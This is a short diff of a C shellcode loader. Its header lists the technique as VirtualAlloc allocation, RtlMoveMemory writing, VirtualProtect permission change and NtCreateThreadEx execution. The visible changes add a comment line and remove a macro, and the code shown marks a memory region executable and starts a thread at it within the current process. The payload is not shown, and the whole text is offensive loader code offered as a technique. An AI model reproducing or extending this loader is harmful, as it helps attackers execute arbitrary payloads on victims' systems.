@@ -9,6 +9,7 @@ Compile:
 
 Technique:
     - allocation: VirtualAlloc
+    - writing:    RtlMoveMemory
     - permission: VirtualProtect
     - execution:  NtCreateThreadEx
 */
@@ -19,7 +20,6 @@ Technique:
 /* ========= some definition ========= */
 #define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
 #define NT_SUCCESS(Status)   ((NTSTATUS)(Status) == STATUS_SUCCESS)
-#define GetCurrentProcess()  ((HANDLE)(LONG_PTR) -1)
 
 /* ========= function signatures ========= */
 typedef NTSTATUS NTAPI NtCreateThreadEx_t (
@@ -69,6 +69,7 @@ int main ()
     retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
     if (retval != 0)
     {
+        // execute in new thread
         NtCreateThreadEx (&h_thread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0, 0, 0, NULL);
         WaitForSingleObject (h_thread, -1);
     }
